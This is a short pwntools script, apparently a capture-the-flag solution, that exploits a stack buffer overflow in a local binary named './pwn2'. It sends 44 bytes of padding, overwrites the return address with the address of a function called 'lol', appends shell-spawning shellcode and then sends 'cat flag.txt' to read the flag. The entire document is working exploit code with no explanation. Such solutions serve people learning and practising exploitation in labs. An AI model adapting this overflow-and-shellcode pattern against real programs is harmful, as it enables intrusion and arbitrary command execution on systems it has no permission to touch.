from pwn import *
context.binary = "./pwn2"
p = process()
p.sendline(
    b"A"*44+p32(context.binary.functions["lol"].address) + asm(shellcraft.sh()))
p.sendline(b"cat flag.txt")
